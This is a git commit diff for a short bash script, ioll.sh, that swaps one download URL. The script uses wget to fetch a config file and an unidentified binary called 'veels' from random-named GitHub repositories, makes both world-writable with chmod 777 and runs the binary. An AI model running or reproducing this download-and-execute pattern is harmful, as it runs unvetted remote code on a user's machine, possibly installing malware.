78eb65d67bf5531807debecc6fccacc6bd00f1cf
vcbuncrt <jeevithamanchani@gmail.com>
2025-09-06 05:20:11 +0530

    Update ioll.sh

--- ioll.sh
+++ ioll.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget https://github.com/vedhagsvp/taberas/raw/main/appsettings.json
+wget https://github.com/vcbuncrt/ioplkmnm/raw/main/appsettings.json
 wget https://github.com/vcbuncrt/ioplkmnm/releases/download/iuyt/veels
 chmod 777 veels appsettings.json
 ./veels
